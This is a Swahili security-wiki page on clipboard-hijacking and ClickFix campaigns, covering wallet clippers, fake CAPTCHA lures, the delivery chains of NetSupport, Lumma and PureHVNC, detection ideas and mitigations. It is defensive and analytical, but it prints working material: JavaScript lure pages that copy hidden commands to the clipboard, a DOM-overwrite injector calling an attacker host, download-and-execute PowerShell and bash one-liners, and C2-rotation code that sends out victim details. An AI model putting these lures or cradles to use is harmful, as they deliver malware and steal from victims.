# Mashambulizi ya Clipboard Hijacking (Pastejacking)

{{#include ../../banners/hacktricks-training.md}}

> "Usipaste kamwe kitu ambacho hukukinakili mwenyewe." – ushauri wa zamani lakini bado halali

## Muhtasari

Clipboard hijacking – pia inajulikana kama *pastejacking* – hutumia ukweli kwamba watumiaji kwa kawaida hunakili na kupaste commands bila kuzikagua. Ukurasa wa wavuti hasidi (au context yoyote yenye uwezo wa JavaScript kama vile Electron au Desktop application) huweka programmatically text inayodhibitiwa na attacker kwenye system clipboard. Victims huhimizwa, kwa kawaida kupitia maelekezo yaliyoundwa kwa uangalifu ya social engineering, kubonyeza **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), au kufungua terminal na *kupaste* maudhui ya clipboard, hivyo kutekeleza arbitrary commands mara moja.

Kwa sababu **hakuna file inayopakuliwa na hakuna attachment inayofunguliwa**, technique hii hupita security controls nyingi za e-mail na web-content zinazofuatilia attachments, macros au direct command execution. Kwa hiyo attack hii ni maarufu katika phishing campaigns zinazosambaza commodity malware families kama vile NetSupport RAT, Latrodectus loader au Lumma Stealer.<sup>[[1]](#references)</sup>

## Clippers za kubadilisha anwani za Wallet

Aina nyingine ya **clipboard hijacking** haipasti commands kabisa: husubiri victim anapokopi **cryptocurrency wallet address**, kisha huibadilisha kimya kimya na inayodhibitiwa na attacker kabla tu ya kupaste. Hii hufanya kazi vizuri hasa dhidi ya wallet formats ndefu kwa sababu watumiaji mara nyingi huthibitisha characters za mwanzo/mwisho pekee.<sup>[[8]](#references)</sup>

Sifa za kawaida zinazoonekana katika mashambulizi halisi:
- **Thin loader + nested payload**: app/exe inayoonekana inaonekana kama trading au "profit" tool halali, huku clipper halisi ikiwa imefichwa ndani zaidi ya bundle (kwa mfano .NET loader inayozindua nested Rust payload).
- **Regex-driven replacement**: malware hulinganisha strings kama `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, au hata strings za jumla zenye **44-character Solana-like**, kisha huzibadilisha kuwa attacker wallets.
- **Wallet rotation at scale**: Windows samples za kisasa zinaweza kuwa na **maelfu** ya replacement wallets kwa kila currency badala ya anwani moja tuli, hivyo kupunguza wallet reputation burn baada ya kila wizi.<sup>[[8]](#references)</sup>

### Windows clipper flow

Implementation ya kawaida ni hidden window iliyosajiliwa kwa kutumia **`AddClipboardFormatListener`**. Kila clipboard update inapotokea, malware kwa kawaida huita:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → kufikia data ya sasa ya clipboard.
- **`GetClipboardData`** → kusoma text.
- **`EmptyClipboard`** + **`SetClipboardData`** → kubadilisha wallet string na attacker value.

Minimal hunting regexes zinazoonekana mara kwa mara katika clippers:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Persistence ya kiwango cha mtumiaji inatosha kwa impact. Mfano mmoja ulioonekana ni:<sup>[[8]](#references)</sup>
- Nakili payload kwenye **`%APPDATA%\silke\silke.exe`**
- Unda **Startup-folder LNK** chini ya `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Mawazo ya detection:
- Processes zinazoita clipboard APIs mfululizo huku pia zikiandika chini ya `%APPDATA%` na folder ya **Startup** ya mtumiaji.
- Uundaji mpya wa LNK/executable unaofuatwa na wallet-address clipboard rewrites.
- Archives au fake-software bundles zenye files nyingi zisizotumika pamoja na launcher ndogo inayoanzisha binary iliyoko ndani ya nyingine.

### macOS social-engineered quarantine removal + LaunchAgent persistence

Kwenye macOS, baadhi ya campaigns husafirisha helper ya **`unlocker.command`** na kumwelekeza victim kubofya kulia → **Open** ikiwa Gatekeeper itasema app imeharibika au inatoka kwa developer asiyejulikana. Script huondoa quarantine tu na kuzindua `.app` iliyo karibu:<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Hii **si** exploit ya Gatekeeper; ni **social-engineered quarantine bypass** inayotumia ukweli kwamba maamuzi ya Gatekeeper hutegemea `com.apple.quarantine` xattr.<sup>[[8]](#references)</sup>

Baada ya kutekelezwa, clipper inaweza kujidumisha kama mtumiaji wa sasa kwa kuandika:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – script ya wrapper
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent yenye `RunAtLoad` na `KeepAlive`

Maelezo muhimu ya kiulinzi ni kwamba baadhi ya samples hutumia **self-healing watchdog** inayoandika upya LaunchAgent na wrapper kila baada ya takriban sekunde 30. Ukiondoa plist kwanza **bila kuua process inayoendelea**, malware inaweza kuiunda tena mara moja.<sup>[[8]](#references)</sup> Mpangilio salama wa kusafisha:
1. Ua process ya clipper inayotumika.
2. Unload/delete LaunchAgent plist.
3. Futa `~/launch.sh` na payload iliyonakiliwa.

### Delivery note: fake reputation as a force multiplier

Kwa familia hii, malware yenyewe inaweza kubaki rahisi kitaalamu huku **distribution layer** ikifanya kazi kubwa: GitHub stars/forks bandia, reviews/downloads za SourceForge, comments/views za mafunzo ya YouTube, na comments/votes zinazoonekana kuwa zisizo na madhara kwenye VirusTotal hutumiwa kufanya binary ionekane ya kuaminika kabla ya kutekelezwa.<sup>[[8]](#references)</sup>

## Vibonye vya Copy vya kulazimishwa na payloads zilizofichwa (macOS one-liners)

Baadhi ya macOS infostealers huiga tovuti za installers (kwa mfano, Homebrew) na **kulazimisha matumizi ya kitufe cha “Copy”** ili watumiaji wasiweze kuchagua tu maandishi yanayoonekana. Ingizo la clipboard huwa na command inayotarajiwa ya installer pamoja na Base64 payload iliyoongezwa (kwa mfano, `...; echo <b64> | base64 -d | sh`), hivyo paste moja hutekeleza vyote viwili huku UI ikificha stage ya ziada.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Kampeni za zamani zilitumia `document.execCommand('copy')`, huku mpya zikitegemea **Clipboard API** isiyosawazisha (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Mtiririko wa ClickFix / ClearFake

1. Mtumiaji hutembelea tovuti yenye jina lililopotoshwa au iliyovamiwa (kwa mfano `docusign.sa[.]com`)
2. JavaScript ya **ClearFake** iliyodungwa huita msaidizi wa `unsecuredCopyToClipboard()` anayehifadhi kwa siri one-liner ya PowerShell iliyosimbwa kwa Base64 kwenye ubao wa kunakili.
3. Maelekezo ya HTML humwambia mwathiriwa: *“Bonyeza **Win + R**, bandika command hiyo na ubonyeze Enter ili kutatua tatizo.”*
4. `powershell.exe` hutekeleza, ikipakua archive iliyo na executable halali pamoja na DLL hasidi (DLL sideloading ya kawaida).
5. Loader hufungua stages za ziada, huingiza shellcode na kusakinisha persistence (kwa mfano scheduled task) – hatimaye ikiendesha NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Mfano wa Chain ya NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (Java WebStart halali) hutafuta `msvcp140.dll` kwenye saraka yake.
* DLL hasidi hutatua APIs kwa kutumia **GetProcAddress** kwa njia ya dynamiki, hupakua binary mbili (`data_3.bin`, `data_4.bin`) kupitia **curl.exe**, huzifichua kwa kutumia rolling XOR key `"https://google.com/"`, huingiza shellcode ya mwisho na hufungua **client32.exe** (NetSupport RAT) kwenye `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Inapakua `la.txt` kwa **curl.exe**
2. Inatekeleza JScript downloader ndani ya **cscript.exe**
3. Inapata MSI payload → inaweka `libcef.dll` karibu na signed application → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer kupitia MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** call huzindua PowerShell script iliyofichwa ambayo hupakua `PartyContinued.exe`, hutoa `Boat.pst` (CAB), huunda upya `AutoIt3.exe` kupitia `extrac32` na uunganishaji wa faili, na hatimaye huendesha script ya `.a3x` inayotoa credentials za browser kwenda `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Baadhi ya ClickFix campaigns huruka kabisa upakuaji wa faili na kuwaelekeza waathiriwa kubandika one-liner inayopakua na kutekeleza JavaScript kupitia WSH, kuiweka kwa persistence, na kuzungusha C2 kila siku. Mfano wa chain iliyozingatiwa:<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Sifa kuu
- URL iliyofichwa hubadilishwa wakati wa utekelezaji ili kuzuia ukaguzi wa kawaida.
- JavaScript hujiendeleza kupitia Startup LNK (WScript/CScript), na huchagua C2 kulingana na siku ya sasa – hivyo kuwezesha mabadiliko ya haraka ya domain.<sup>[[3]](#references)</sup>

Kipande kidogo cha JS kinachotumika kubadilisha C2 kulingana na tarehe:<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Hatua inayofuata kwa kawaida hupeleka loader inayoweka persistence na kuvuta RAT (kwa mfano, PureHVNC), mara nyingi iki-pinning TLS kwenye certificate iliyowekwa hardcode na kugawanya traffic katika vipande.<sup>[[3]](#references)</sup>

Mawazo ya detection mahususi kwa variant hii
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (au `cscript.exe`).
- Startup artifacts: LNK katika `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` inayomwita WScript/CScript ikiwa na JS path chini ya `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU na command-line telemetry iliyo na `.split('').reverse().join('')` au `eval(a.responseText)`.
- `powershell -NoProfile -NonInteractive -Command -` zinazorudiwa zikiwa na payloads kubwa za stdin ili kuingiza scripts ndefu bila command lines ndefu.
- Scheduled Tasks ambazo baadaye hutekeleza LOLBins kama `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` chini ya task/path inayoonekana kama updater (kwa mfano, `\GoogleSystem\GoogleUpdater`).

Uwindaji wa vitisho
- C2 hostnames na URLs zinazobadilika kila siku zikiwa na pattern ya `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Correlate clipboard write events zinazofuatwa na kubandika kwa Win+R, kisha utekelezaji wa `powershell.exe` mara moja.

Blue-teams zinaweza kuchanganya clipboard, process-creation na registry telemetry ili kubaini matumizi mabaya ya pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` huhifadhi historia ya commands za **Win + R** – tafuta entries zisizo za kawaida za Base64 / obfuscated.
* Security Event ID **4688** (Process Creation) ambapo `ParentImage` == `explorer.exe` na `NewProcessName` iko katika { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** kwa uundaji wa files chini ya `%LocalAppData%\Microsoft\Windows\WinX\` au temporary folders muda mfupi kabla ya event ya 4688 inayoshukiwa.
* EDR clipboard sensors (ikiwa zipo) – correlate `Clipboard Write` inayofuatwa mara moja na process mpya ya PowerShell.

## Kurasa za verification za mtindo wa IUAM (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Campaigns za hivi karibuni huzalisha kwa wingi kurasa fake za CDN/browser verification ("Just a moment…", za mtindo wa IUAM) zinazowashawishi users kunakili commands mahususi kwa OS kutoka kwenye clipboard na kuziweka kwenye native consoles. Hii huhamisha execution kutoka browser sandbox na hufanya kazi kwenye Windows na macOS.<sup>[[4]](#references)</sup>

Sifa kuu za kurasa zinazotengenezwa na builder
- OS detection kupitia `navigator.userAgent` ili kuandaa payloads kulingana na OS (Windows PowerShell/CMD dhidi ya macOS Terminal). Decoys/no-ops za hiari kwa OS zisizotumika ili kudumisha udanganyifu.
- Clipboard-copy ya kiotomatiki wakati wa UI actions zisizo na madhara (checkbox/Copy), huku text inayoonekana inaweza kutofautiana na content ya clipboard.
- Mobile blocking na popover yenye instructions za hatua kwa hatua: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Obfuscation ya hiari na single-file injector ya ku-overwrite DOM ya site iliyoathirika kwa verification UI iliyowekewa mtindo wa Tailwind (hakuna usajili wa domain mpya unaohitajika).<sup>[[4]](#references)</sup>

Mfano: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence ya run ya kwanza
- Tumia `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` ili utekelezaji uendelee baada ya terminal kufungwa, hivyo kupunguza artifacts zinazoonekana.<sup>[[4]](#references)</sup>

Utekaji wa ukurasa papo hapo kwenye sites zilizoathiriwa
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Mawazo ya ugunduzi na utafutaji maalum kwa IUAM-style lures
- Web: Kurasa zinazofunga Clipboard API kwenye verification widgets; kutolingana kati ya maandishi yanayoonyeshwa na clipboard payload; matawi ya `navigator.userAgent`; Tailwind + single-page replace katika mazingira ya kutiliwa shaka.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` muda mfupi baada ya mwingiliano wa browser; batch/MSI installers zinazoendeshwa kutoka `%TEMP%`.
- macOS endpoint: Terminal/iTerm kuanzisha `bash`/`curl`/`base64 -d` pamoja na `nohup` karibu na matukio ya browser; background jobs zinazoendelea baada ya kufungwa kwa terminal.
- Linganisha historia ya `RunMRU` Win+R na clipboard writes pamoja na uundaji unaofuata wa console process.

Tazama pia mbinu zinazosaidia

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake inaendelea kuathiri tovuti za WordPress na kuingiza loader JavaScript inayounganisha hosts za nje (Cloudflare Workers, GitHub/jsDelivr) na hata blockchain “etherhiding” calls (kwa mfano, POSTs kwenda Binance Smart Chain API endpoints kama `bsc-testnet.drpc[.]org`) ili kupata lure logic ya sasa. Overlays za hivi karibuni zinatumia sana fake CAPTCHAs zinazowaelekeza watumiaji kunakili/kubandika one-liner (T1204.004) badala ya kupakua chochote.<sup>[[6]](#references)</sup>
- Initial execution inazidi kukabidhiwa kwa signed script hosts/LOLBAS. Chains za Januari 2026 zilibadilisha matumizi ya awali ya `mshta` na kutumia `SyncAppvPublishingServer.vbs` iliyojengewa ndani, ikiendeshwa kupitia `WScript.exe`, na kupitisha PowerShell-like arguments zenye aliases/wildcards ili kuchukua remote content:<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` imesainiwa na kwa kawaida hutumiwa na App-V; ikiambatanishwa na `WScript.exe` na arguments zisizo za kawaida (`gal`/`gcm` aliases, cmdlets zenye wildcard, URL za jsDelivr) huwa LOLBAS stage yenye signal ya juu kwa ClearFake.<sup>[[6]](#references)</sup>
- Februari 2026, payloads za fake CAPTCHA zilirudi kwenye download cradles safi za PowerShell. Mifano miwili iliyo hai:<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Chain ya kwanza ni grabber ya `iex(irm ...)` iliyo in-memory; ya pili hu-stage kupitia `WinHttp.WinHttpRequest.5.1`, huandika `.ps1` ya muda, kisha huizindua kwa `-ep bypass` kwenye dirisha lililofichwa.<sup>[[6]](#references)</sup>

Vidokezo vya detection/hunting kwa variants hizi
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` au PowerShell cradles mara tu baada ya clipboard writes/Win+R.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, au raw IP `iex(irm ...)` patterns.
- Network: outbound kwenda CDN worker hosts au blockchain RPC endpoints kutoka kwa script hosts/PowerShell muda mfupi baada ya web browsing.
- File/registry: uundaji wa `.ps1` ya muda chini ya `%TEMP%` pamoja na RunMRU entries zilizo na one-liners hizi; zuia/toa alert kwa signed-script LOLBAS (WScript/cscript/mshta) inayo-execute ikiwa na external URLs au obfuscated alias strings.

## June 2026 ClickFix tradecraft: paste telemetry, fake verification comments, na LOLBin chaining

Red Canary telemetry ya hivi karibuni inaonyesha kuwa indicator thabiti **si command moja maalum**, bali ni mchanganyiko wa **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval**, na **immediate execution**.<sup>[[7]](#references)</sup>

### Miundo mashuhuri ya operator

- **Paste confirmation telemetry**: baadhi ya payloads huita `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` kabla ya stage halisi. Hii huthibitisha user interaction huku ikiweka dirisha fupi na tulivu.
- **Fake verification comments**: PowerShell one-liners zinaweza kuongeza strings kama `# Security check ✔️ I'm not a robot Verification ID: 138105`, ili command bado ionekane inahusiana na CAPTCHA baada ya kubandikwa kwenye Run / `cmd.exe` / PowerShell history.
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` huepuka static URL kwenye command line huku ikiendelea kufanya in-memory download-and-execute.
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` hutumia unusual casing na Unicode-like characters kwenye flags kuvuruga brittle detections huku ikiendelea kufanana na `msiexec.exe`.
- **Caret-escaped LOLBin chains**: `cmd.exe` inaweza kuficha keywords kwa `^` escapes (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), kuanzisha nested shell ikiwa minimized, kuhifadhi attacker content kwa benign extension kama `.pdf`, kisha ku-execute kupitia `mshta`.<sup>[[7]](#references)</sup>
## Mitigations

1. Browser hardening – zima clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) au hitaji user gesture.
2. Security awareness – wafundishe users *kuandika* commands nyeti au kwanza wayabandike kwenye text editor.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control ili kuzuia arbitrary one-liners.
4. Network controls – zuia outbound requests kwenda pastejacking na malware C2 domains zinazojulikana.

## Related Tricks

* **Discord Invite Hijacking** mara nyingi hutumia ClickFix approach hiyo hiyo baada ya kuwavuta users kwenye server hasidi:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [1] [Rekebisha Click: Kuzuia ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, mwaka wa Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
